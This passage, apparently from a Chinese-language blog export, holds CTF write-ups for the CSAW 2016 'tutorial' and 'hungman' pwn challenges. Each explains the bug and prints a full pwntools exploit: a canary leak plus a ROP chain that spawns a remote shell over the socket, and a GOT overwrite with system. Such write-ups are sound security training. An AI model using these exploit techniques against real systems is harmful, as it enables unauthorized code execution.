'\\0'))\n\n\np.recvuntil('>')\np.sendline('1')\np.recvuntil(':')\nbuf=p.recvline()\nputs_addr=int(buf,16)+1280\nprint 'puts_addr: '+hex(puts_addr)\n\n#system_addr=puts_addr-0x000000000006b990+0x0000000000041490\n#str_sh=puts_addr-0x000000000006b990+0x1639a0\n#dup2_addr=puts_addr-0x000000000006b990+0x00000000000dc490\nsystem_addr=puts_addr-0x000000000006fd60+0x0000000000046590\nstr_sh=puts_addr-0x000000000006fd60+0x17c8c3\ndup2_addr=puts_addr-0x000000000006fd60+0x00000000000ebe90\nprint 'system_addr: '+hex(system_addr)\nprint 'binsh_addr: '+hex(str_sh)\n\n\n# ======== leak canary and stack address =========\npayload='A'*4\n\np.recvuntil('>')\np.sendline('2')\np.recvuntil('>')\np.sendline(payload)\nleak=p.recvn(0x144)\n\ncanary=pick64(leak[-12:-4])\nprint 'canary: '+hex(canary)\n\n\n# ======== ROP =========\npayload2='A'*312\npayload2+=p64(canary)*2\n\n# dup2(4,1)\npayload2+=p64(poprdi)\npayload2+=p64(4)\npayload2+=p64(poprsi)\npayload2+=p64(1)*2\npayload2+=p64(dup2_addr)\n\n#dup2(4,0)\npayload2+=p64(poprdi)\npayload2+=p64(4)\npayload2+=p64(poprsi)\npayload2+=p64(0)*2\npayload2+=p64(dup2_addr)\n\n# system('/bin/sh')\npayload2+=p64(poprdi)\npayload2+=p64(str_sh)\npayload2+=p64(system_addr)\n\np.recvuntil('>')\np.sendline('2')\np.recvuntil('>')\np.sendline(payload2)\np.interactive()\n```\n\n","source":"_posts/csaw_2016_tutorial_writeup.md","raw":"title: CSAW 2016 tutorial writeup\n\ndate: 2016/09/19 16:48:00\n\n---\n\n200分的Pwn\n\n同样也是拿到手简单跑一下就扔进IDA里静态看。\n程序主体不多，一个服务端程序，用第一个参数作为监听端口，然后就是常规的bind，listen，fork来处理。nc连上去会有三个选项，一个减法运算过的puts函数在libc中的地址，第二个接受输入然后造成栈溢出，第三个退出。\n\n<!--more-->\n\n由于已经给了libc就很好办了，拿了puts地址算system、\"/bin/sh\"地址，除此之外还要找一个dup2地址来把标准输出输入重定向到socket来，否则只是在服务端调用了system（这个一开始也没注意到，觉得没问题可是不见shell回来又折腾了一下才突然发现没重定向），然后来一波ROP就可以。\n\n完整exploit：\n\n```python\nfrom pwn import *\n\n#p=remote('127.0.0.1',9990)\np=remote('pwn.chal.csaw.io',8002)\n\npoprdi=0x00000000004012e3 # pop rdi ; ret\npoprsi=0x00000000004012e1 # pop rsi ; pop r15 ; ret\npick64 = lambda x: u64(x.ljust(8, '\\0'))\n\n\np.recvuntil('>')\np.sendline('1')\np.recvuntil(':')\nbuf=p.recvline()\nputs_addr=int(buf,16)+1280\nprint 'puts_addr: '+hex(puts_addr)\n\n#system_addr=puts_addr-0x000000000006b990+0x0000000000041490\n#str_sh=puts_addr-0x000000000006b990+0x1639a0\n#dup2_addr=puts_addr-0x000000000006b990+0x00000000000dc490\nsystem_addr=puts_addr-0x000000000006fd60+0x0000000000046590\nstr_sh=puts_addr-0x000000000006fd60+0x17c8c3\ndup2_addr=puts_addr-0x000000000006fd60+0x00000000000ebe90\nprint 'system_addr: '+hex(system_addr)\nprint 'binsh_addr: '+hex(str_sh)\n\n\n# ======== leak canary and stack address =========\npayload='A'*4\n\np.recvuntil('>')\np.sendline('2')\np.recvuntil('>')\np.sendline(payload)\nleak=p.recvn(0x144)\n\ncanary=pick64(leak[-12:-4])\nprint 'canary: '+hex(canary)\n\n\n# ======== ROP =========\npayload2='A'*312\npayload2+=p64(canary)*2\n\n# dup2(4,1)\npayload2+=p64(poprdi)\npayload2+=p64(4)\npayload2+=p64(poprsi)\npayload2+=p64(1)*2\npayload2+=p64(dup2_addr)\n\n#dup2(4,0)\npayload2+=p64(poprdi)\npayload2+=p64(4)\npayload2+=p64(poprsi)\npayload2+=p64(0)*2\npayload2+=p64(dup2_addr)\n\n# system('/bin/sh')\npayload2+=p64(poprdi)\npayload2+=p64(str_sh)\npayload2+=p64(system_addr)\n\np.recvuntil('>')\np.sendline('2')\np.recvuntil('>')\np.sendline(payload2)\np.interactive()\n```\n\n","slug":"csaw_2016_tutorial_writeup","published":1,"updated":"2016-11-03T01:40:27.448Z","_id":"civ1ongw60000ai60osac1906","comments":1,"layout":"post","photos":[],"link":"","content":"<p>200分的Pwn</p>\n<p>同样也是拿到手简单跑一下就扔进IDA里静态看。<br>程序主体不多，一个服务端程序，用第一个参数作为监听端口，然后就是常规的bind，listen，fork来处理。nc连上去会有三个选项，一个减法运算过的puts函数在libc中的地址，第二个接受输入然后造成栈溢出，第三个退出。</p>\n<a id=\"more\"></a>\n<p>由于已经给了libc就很好办了，拿了puts地址算system、”/bin/sh”地址，除此之外还要找一个dup2地址来把标准输出输入重定向到socket来，否则只是在服务端调用了system（这个一开始也没注意到，觉得没问题可是不见shell回来又折腾了一下才突然发现没重定向），然后来一波ROP就可以。</p>\n<p>完整exploit：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#p=remote('127.0.0.1',9990)</span></div><div class=\"line\">p=remote(<span class=\"string\">'pwn.chal.csaw.io'</span>,<span class=\"number\">8002</span>)</div><div class=\"line\"></div><div class=\"line\">poprdi=<span class=\"number\">0x00000000004012e3</span> <span class=\"comment\"># pop rdi ; ret</span></div><div class=\"line\">poprsi=<span class=\"number\">0x00000000004012e1</span> <span class=\"comment\"># pop rsi ; pop r15 ; ret</span></div><div class=\"line\">pick64 = <span class=\"keyword\">lambda</span> x: u64(x.ljust(<span class=\"number\">8</span>, <span class=\"string\">'\\0'</span>))</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">p.recvuntil(<span class=\"string\">'&gt;'</span>)</div><div class=\"line\">p.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">p.recvuntil(<span class=\"string\">':'</span>)</div><div class=\"line\">buf=p.recvline()</div><div class=\"line\">puts_addr=int(buf,<span class=\"number\">16</span>)+<span class=\"number\">1280</span></div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'puts_addr: '</span>+hex(puts_addr)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#system_addr=puts_addr-0x000000000006b990+0x0000000000041490</span></div><div class=\"line\"><span class=\"comment\">#str_sh=puts_addr-0x000000000006b990+0x1639a0</span></div><div class=\"line\"><span class=\"comment\">#dup2_addr=puts_addr-0x000000000006b990+0x00000000000dc490</span></div><div class=\"line\">system_addr=puts_addr<span class=\"number\">-0x000000000006fd60</span>+<span class=\"number\">0x0000000000046590</span></div><div class=\"line\">str_sh=puts_addr<span class=\"number\">-0x000000000006fd60</span>+<span class=\"number\">0x17c8c3</span></div><div class=\"line\">dup2_addr=puts_addr<span class=\"number\">-0x000000000006fd60</span>+<span class=\"number\">0x00000000000ebe90</span></div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'system_addr: '</span>+hex(system_addr)</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'binsh_addr: '</span>+hex(str_sh)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># ======== leak canary and stack address =========</span></div><div class=\"line\">payload=<span class=\"string\">'A'</span>*<span class=\"number\">4</span></div><div class=\"line\"></div><div class=\"line\">p.recvuntil(<span class=\"string\">'&gt;'</span>)</div><div class=\"line\">p.sendline(<span class=\"string\">'2'</span>)</div><div class=\"line\">p.recvuntil(<span class=\"string\">'&gt;'</span>)</div><div class=\"line\">p.sendline(payload)</div><div class=\"line\">leak=p.recvn(<span class=\"number\">0x144</span>)</div><div class=\"line\"></div><div class=\"line\">canary=pick64(leak[<span class=\"number\">-12</span>:<span class=\"number\">-4</span>])</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'canary: '</span>+hex(canary)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># ======== ROP =========</span></div><div class=\"line\">payload2=<span class=\"string\">'A'</span>*<span class=\"number\">312</span></div><div class=\"line\">payload2+=p64(canary)*<span class=\"number\">2</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># dup2(4,1)</span></div><div class=\"line\">payload2+=p64(poprdi)</div><div class=\"line\">payload2+=p64(<span class=\"number\">4</span>)</div><div class=\"line\">payload2+=p64(poprsi)</div><div class=\"line\">payload2+=p64(<span class=\"number\">1</span>)*<span class=\"number\">2</span></div><div class=\"line\">payload2+=p64(dup2_addr)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#dup2(4,0)</span></div><div class=\"line\">payload2+=p64(poprdi)</div><div class=\"line\">payload2+=p64(<span class=\"number\">4</span>)</div><div class=\"line\">payload2+=p64(poprsi)</div><div class=\"line\">payload2+=p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span></div><div class=\"line\">payload2+=p64(dup2_addr)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># system('/bin/sh')</span></div><div class=\"line\">payload2+=p64(poprdi)</div><div class=\"line\">payload2+=p64(str_sh)</div><div class=\"line\">payload2+=p64(system_addr)</div><div class=\"line\"></div><div class=\"line\">p.recvuntil(<span class=\"string\">'&gt;'</span>)</div><div class=\"line\">p.sendline(<span class=\"string\">'2'</span>)</div><div class=\"line\">p.recvuntil(<span class=\"string\">'&gt;'</span>)</div><div class=\"line\">p.sendline(payload2)</div><div class=\"line\">p.interactive()</div></pre></td></tr></table></figure>\n","excerpt":"<p>200分的Pwn</p>\n<p>同样也是拿到手简单跑一下就扔进IDA里静态看。<br>程序主体不多，一个服务端程序，用第一个参数作为监听端口，然后就是常规的bind，listen，fork来处理。nc连上去会有三个选项，一个减法运算过的puts函数在libc中的地址，第二个接受输入然后造成栈溢出，第三个退出。</p>","more":"<p>由于已经给了libc就很好办了，拿了puts地址算system、”/bin/sh”地址，除此之外还要找一个dup2地址来把标准输出输入重定向到socket来，否则只是在服务端调用了system（这个一开始也没注意到，觉得没问题可是不见shell回来又折腾了一下才突然发现没重定向），然后来一波ROP就可以。</p>\n<p>完整exploit：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#p=remote('127.0.0.1',9990)</span></div><div class=\"line\">p=remote(<span class=\"string\">'pwn.chal.csaw.io'</span>,<span class=\"number\">8002</span>)</div><div class=\"line\"></div><div class=\"line\">poprdi=<span class=\"number\">0x00000000004012e3</span> <span class=\"comment\"># pop rdi ; ret</span></div><div class=\"line\">poprsi=<span class=\"number\">0x00000000004012e1</span> <span class=\"comment\"># pop rsi ; pop r15 ; ret</span></div><div class=\"line\">pick64 = <span class=\"keyword\">lambda</span> x: u64(x.ljust(<span class=\"number\">8</span>, <span class=\"string\">'\\0'</span>))</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">p.recvuntil(<span class=\"string\">'&gt;'</span>)</div><div class=\"line\">p.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">p.recvuntil(<span class=\"string\">':'</span>)</div><div class=\"line\">buf=p.recvline()</div><div class=\"line\">puts_addr=int(buf,<span class=\"number\">16</span>)+<span class=\"number\">1280</span></div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'puts_addr: '</span>+hex(puts_addr)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#system_addr=puts_addr-0x000000000006b990+0x0000000000041490</span></div><div class=\"line\"><span class=\"comment\">#str_sh=puts_addr-0x000000000006b990+0x1639a0</span></div><div class=\"line\"><span class=\"comment\">#dup2_addr=puts_addr-0x000000000006b990+0x00000000000dc490</span></div><div class=\"line\">system_addr=puts_addr<span class=\"number\">-0x000000000006fd60</span>+<span class=\"number\">0x0000000000046590</span></div><div class=\"line\">str_sh=puts_addr<span class=\"number\">-0x000000000006fd60</span>+<span class=\"number\">0x17c8c3</span></div><div class=\"line\">dup2_addr=puts_addr<span class=\"number\">-0x000000000006fd60</span>+<span class=\"number\">0x00000000000ebe90</span></div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'system_addr: '</span>+hex(system_addr)</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'binsh_addr: '</span>+hex(str_sh)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># ======== leak canary and stack address =========</span></div><div class=\"line\">payload=<span class=\"string\">'A'</span>*<span class=\"number\">4</span></div><div class=\"line\"></div><div class=\"line\">p.recvuntil(<span class=\"string\">'&gt;'</span>)</div><div class=\"line\">p.sendline(<span class=\"string\">'2'</span>)</div><div class=\"line\">p.recvuntil(<span class=\"string\">'&gt;'</span>)</div><div class=\"line\">p.sendline(payload)</div><div class=\"line\">leak=p.recvn(<span class=\"number\">0x144</span>)</div><div class=\"line\"></div><div class=\"line\">canary=pick64(leak[<span class=\"number\">-12</span>:<span class=\"number\">-4</span>])</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'canary: '</span>+hex(canary)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># ======== ROP =========</span></div><div class=\"line\">payload2=<span class=\"string\">'A'</span>*<span class=\"number\">312</span></div><div class=\"line\">payload2+=p64(canary)*<span class=\"number\">2</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># dup2(4,1)</span></div><div class=\"line\">payload2+=p64(poprdi)</div><div class=\"line\">payload2+=p64(<span class=\"number\">4</span>)</div><div class=\"line\">payload2+=p64(poprsi)</div><div class=\"line\">payload2+=p64(<span class=\"number\">1</span>)*<span class=\"number\">2</span></div><div class=\"line\">payload2+=p64(dup2_addr)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#dup2(4,0)</span></div><div class=\"line\">payload2+=p64(poprdi)</div><div class=\"line\">payload2+=p64(<span class=\"number\">4</span>)</div><div class=\"line\">payload2+=p64(poprsi)</div><div class=\"line\">payload2+=p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span></div><div class=\"line\">payload2+=p64(dup2_addr)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># system('/bin/sh')</span></div><div class=\"line\">payload2+=p64(poprdi)</div><div class=\"line\">payload2+=p64(str_sh)</div><div class=\"line\">payload2+=p64(system_addr)</div><div class=\"line\"></div><div class=\"line\">p.recvuntil(<span class=\"string\">'&gt;'</span>)</div><div class=\"line\">p.sendline(<span class=\"string\">'2'</span>)</div><div class=\"line\">p.recvuntil(<span class=\"string\">'&gt;'</span>)</div><div class=\"line\">p.sendline(payload2)</div><div class=\"line\">p.interactive()</div></pre></td></tr></table></figure>"},{"title":"CSAW 2016 hungman writeup","date":"2016-09-19T09:48:00.000Z","_content":"\n300分的pwn\n\n程序是一个简单的游戏，在你输入名字后，将名字存入malloc出的chunk中，然后会生成一个结构体，大概长这样：\n\n<!--more-->\n\n```\n00000000 struc_obj       struc ; (sizeof=0x80)\n00000000 score           dd ?\n00000004 name_len        dd ?\n00000008 namep           dq ?\n00000010 content         db 112 dup(?)\n00000080 struc_obj       ends\n00000080\n```\n\n然后开始游戏主循环，在主循环中生成一个和名字大小相同的buf，然后将其与随机数一阵操作生成新的随机buf：\n\n```\n    for ( i = 0LL; name_len - 1 > i; ++i )\n    {\n      *((_BYTE *)buf + i) ^= *(_BYTE *)(objp->namep + i);\n      *((_BYTE *)buf + i) = *((_BYTE *)buf + i) % 26u + 97;\n    }\n```\n所以操作结束后buf中将只有小写字母的ascii码，然后打印一排\"_\"代表buf，接着就是接收输入字符，如果buf中有这个字符，就在下次对应位置打印这个字符而不是\"_\"，有三次机会可以猜错，机会用完后或者全部猜出来后会获得一次修改名字的机会，这里就是漏洞所在，如果输入的名字比原来的长就可能发生溢出，因为操作长这样：\n\n```\nif ( objp->score > score_history )\n    {\n      puts(\"High score! change name?\");\n      __isoc99_scanf(0x40114FLL, &v3);          // %c\n      if ( v3 == 121 )\n      {\n        namep = malloc(0xF8uLL);\n        memset(namep, 0, 0xF8uLL);\n        new_name_len = read(0, namep, 0xF8uLL);\n        objp->name_len = new_name_len;\n        v14 = strchr((const char *)namep, 10);\n        if ( v14 )\n          *v14 = 0;\n        memcpy((void *)objp->namep, namep, new_name_len);// ---- overflow  \n        free(namep);\n      }\n      snprintf(byte_602100, 0x200uLL, \"Highest player: %s\", objp->namep);\n      score_history = objp->score;\n    }\n```\n\n所以如果我们一开始较长的name，那么buf中所有字母基本就都会出现，依次把所有字母输一圈就可以赢得游戏获得改名字的机会，就可以更改较长的名字首先泄漏strchr地址，然后再赢得一次游戏将strchr@got替换位system，然后再赢得一次将name换为/bin/sh触发system就可以了。\n\n但是这里有几个坑，在这里记录一下：\n一是一开始选择泄漏函数的时候选了free，但是发现free地址低位是\\x00正好截断，所以就换了strchr（不过偏移一位再泄漏free也可以）。\n二是选择了strchr后，但是对应的strchr@got上填的地址是strchr_see2，应该是某种优化，所以这里又耽搁了一下。\n三是在最后发送system地址过去的时候不能使用sendline，只能使用send，因为sendline导致9个字符被memcpy过去，导致strchr@got下面的printf@got被破坏，崩溃了没得玩了。\n四是不知为何在第一次发送name的时候前面必须加个time.sleep(0.1)，或者在play()中加个print recv，否则就可能成功可能失败，这里到现在我也不知道是因为什么，调试的话一点问题也没有，所以到现在还是憋着找不出原因。\n\n参考exploit：\n\n```python\nfrom pwn import *\n\nletters='abcdefghijklmnopqrstuvwxyzz'\nname='A'*32\np=process('./hungman')\nfree_got=0x602018\nstrchr_got=0x602038\n#context.log_level='debug'\n\ndef getpid(name):\n\tpid= pwnlib.util.proc.pidof(name)\n\tlog.info(pid)\n\traw_input('continue')\n\ndef play():\n\tprint '-- play --'\n\tfor c in letters:\n\t\trecv=p.recvline()\n\t\tprint recv\n\t\tif recv.startswith('High score! change name?'):\n\t\t\t# I do not know why it need to print recv here,\n\t\t\t# or it will failed to recieve in line 42\n\t\t\t# time.sleep(0.1) can works here too. why ???\n\t\t\tprint recv\n\t\t\tprint '[*] win!'\n\t\t\tp.sendline('y')\n\t\t\treturn\n\t\tif recv.startswith('Default Highscore  score: 64'):\n\t\t\tprint '[-] try again...'\n\t\t\tp.recvuntil('Continue? ')\n\t\t\tp.sendline('y')\n\t\t\treturn play()\n\t\tp.sendline(c)\t\n\np.recvline()\np.sendline('A'*30)\np.recvline()\nplay()\np.sendline(name+p64(0x0)+p64(0x91)+p32(0x52)+p32(0xc9)+p64(strchr_got))\n#context.update(terminal=['tmux','splitw','-h'])\n#gdb.attach(p,'b *0x0000000000400E77')\n\np.recvuntil('Highest player: ')\nstrchr_addr=p.recvuntil(' score:')[:-7]\nstrchr_addr=u64(strchr_addr.ljust(8, '\\0'))\n\n# actually it is address of strchr_see2, not strchr\nprint 'strchr addr: '+hex(strchr_addr)\nsystem_addr=strchr_addr-0x30-0x000000000007ff70+0x0000000000041490\nprint 'system addr: '+hex(system_addr)\n\np.recvuntil('Continue? ')\np.sendline('y')\nplay()\n# getpid('hungman')\n# can not use sendline() here cause it will crash printf@got.plt\np.send(p64(system_addr))\np.recvuntil('Continue? ')\np.sendline('y')\nplay()\np.sendline('/bin/sh')\np.interactive()\n```\n\n\n\n\n\n","source":"_posts/csaw_2016_hungman_writeup.md","raw":"title: CSAW 2016 hungman writeup\n\ndate: 2016/09/19 17:48:00\n\n---\n\n300分的pwn\n\n程序是一个简单的游戏，在你输入名字后，将名字存入malloc出的chunk中，然后会生成一个结构体，大概长这样：\n\n<!--more-->\n\n```\n00000000 struc_obj       struc ; (sizeof=0x80)\n00000000 score           dd ?\n00000004 name_len        dd ?\n00000008 namep           dq ?\n00000010 content         db 112 dup(?)\n00000080 struc_obj       ends\n00000080\n```\n\n然后开始游戏主循环，在主循环中生成一个和名字大小相同的buf，然后将其与随机数一阵操作生成新的随机buf：\n\n```\n    for ( i = 0LL; name_len - 1 > i; ++i )\n    {\n      *((_BYTE *)buf + i) ^= *(_BYTE *)(objp->namep + i);\n      *((_BYTE *)buf + i) = *((_BYTE *)buf + i) % 26u + 97;\n    }\n```\n所以操作结束后buf中将只有小写字母的ascii码，然后打印一排\"_\"代表buf，接着就是接收输入字符，如果buf中有这个字符，就在下次对应位置打印这个字符而不是\"_\"，有三次机会可以猜错，机会用完后或者全部猜出来后会获得一次修改名字的机会，这里就是漏洞所在，如果输入的名字比原来的长就可能发生溢出，因为操作长这样：\n\n```\nif ( objp->score > score_history )\n    {\n      puts(\"High score! change name?\");\n      __isoc99_scanf(0x40114FLL, &v3);          // %c\n      if ( v3 == 121 )\n      {\n        namep = malloc(0xF8uLL);\n        memset(namep, 0, 0xF8uLL);\n        new_name_len = read(0, namep, 0xF8uLL);\n        objp->name_len = new_name_len;\n        v14 = strchr((const char *)namep, 10);\n        if ( v14 )\n          *v14 = 0;\n        memcpy((void *)objp->namep, namep, new_name_len);// ---- overflow  \n        free(namep);\n      }\n      snprintf(byte_602100, 0x200uLL, \"Highest player: %s\", objp->namep);\n      score_history = objp->score;\n    }\n```\n\n所以如果我们一开始较长的name，那么buf中所有字母基本就都会出现，依次把所有字母输一圈就可以赢得游戏获得改名字的机会，就可以更改较长的名字首先泄漏strchr地址，然后再赢得一次游戏将strchr@got替换位system，然后再赢得一次将name换为/bin/sh触发system就可以了。\n\n但是这里有几个坑，在这里记录一下：\n一是一开始选择泄漏函数的时候选了free，但是发现free地址低位是\\x00正好截断，所以就换了strchr（不过偏移一位再泄漏free也可以）。\n二是选择了strchr后，但是对应的strchr@got上填的地址是strchr_see2，应该是某种优化，所以这里又耽搁了一下。\n三是在最后发送system地址过去的时候不能使用sendline，只能使用send，因为sendline导致9个字符被memcpy过去，导致strchr@got下面的printf@got被破坏，崩溃了没得玩了。\n四是不知为何在第一次发送name的时候前面必须加个time.sleep(0.1)，或者在play()中加个print recv，否则就可能成功可能失败，这里到现在我也不知道是因为什么，调试的话一点问题也没有，所以到现在还是憋着找不出原因。\n\n参考exploit：\n\n```python\nfrom pwn import *\n\nletters='abcdefghijklmnopqrstuvwxyzz'\nname='A'*32\np=process('./hungman')\nfree_got=0x602018\nstrchr_got=0x602038\n#context.log_level='debug'\n\ndef getpid(name):\n\tpid= pwnlib.util.proc.pidof(name)\n\tlog.info(pid)\n\traw_input('continue')\n\ndef play():\n\tprint '-- play --'\n\tfor c in letters:\n\t\trecv=p.recvline()\n\t\tprint recv\n\t\tif recv.startswith('High score! change name?'):\n\t\t\t# I do not know why it need to print recv here,\n\t\t\t# or it will failed to recieve in line 42\n\t\t\t# time.sleep(0.1) can works here too. why ???\n\t\t\tprint recv\n\t\t\tprint '[*] win!'\n\t\t\tp.sendline('y')\n\t\t\treturn\n\t\tif recv.startswith('Default Highscore  score: 64'):\n\t\t\tprint '[-] try again...'\n\t\t\tp.recvuntil('Continue? ')\n\t\t\tp.sendline('y')\n\t\t\treturn play()\n\t\tp.sendline(c)\t\n\np.recvline()\np.sendline('A'*30)\np.recvline()\nplay()\np.sendline(name+p64(0x0)+p64(0x91)+p32(0x52)+p32(0xc9)+p64(strchr_got))\n#context.update(terminal=['tmux','splitw','-h'])\n#gdb.attach(p,'b *0x0000000000400E77')\n\np.recvuntil('Highest player: ')\nstrchr_addr=p.recvuntil(' score:')[:-7]\nstrchr_addr=u64(strchr_addr.ljust(8, '\\0'))\n\n# actually it is address of strchr_see2, not strchr\nprint 'strchr addr: '+hex(strchr_addr)\nsystem_addr=strchr_addr-0x30-0x000000000007ff70+0x0000000000041490\nprint 'system addr: '+hex(system_addr)\n\np.recvuntil('Continue? ')\np.sendline('y')\nplay()\n# getpid('hungman')\n# can not use sendline() here cause it will crash printf@got.plt\np.send(p64(system_addr))\np.recvuntil('Continue? ')\np.sendline('y')\nplay()\np.sendline('/bin/sh')\np.interactive()\n```\n\n\n\n\n\n","slug":"csaw_2016_hungman_writeup","published":1,"updated":"2016-11-01T16:34:48.744Z","comments":1,"layout":"post","photos":[],"link":"","_id":"civ2jnuup00007b60obfu8myl","content":"<p>300分的pwn</p>\n<p>程序是一个简单的游戏，在你输入名字后，将名字存入malloc出的chunk中，然后会生成一个结构体，大概长这样：</p>\n<a id=\"more\"></a>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">00000000 struc_obj       struc ; (sizeof=0x80)</div><div class=\"line\">00000000 score           dd ?</div><div class=\"line\">00000004 name_len        dd ?</div><div class=\"line\">00000008 namep           dq ?</div><div class=\"line\">00000010 content         db 112 dup(?)</div><div class=\"line\">00000080 struc_obj       ends</div><div class=\"line\">00000080</div></pre></td></tr></table></figure>\n<p>然后开始游戏主循环，在主循环中生成一个和名字大小相同的buf，然后将其与随机数一阵操作生成新的随机buf：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">for ( i = 0LL; name_len - 1 &gt; i; ++i )</div><div class=\"line\">&#123;</div><div class=\"line\">  *((_BYTE *)buf + i) ^= *(_BYTE *)(objp-&gt;namep + i);</div><div class=\"line\">  *((_BYTE *)buf + i) = *((_BYTE *)buf + i) % 26u + 97;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>所以操作结束后buf中将只有小写字母的ascii码，然后打印一排”<em>“代表buf，接着就是接收输入字符，如果buf中有这个字符，就在下次对应位置打印这个字符而不是”</em>“，有三次机会可以猜错，机会用完后或者全部猜出来后会获得一次修改名字的机会，这里就是漏洞所在，如果输入的名字比原来的长就可能发生溢出，因为操作长这样：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div 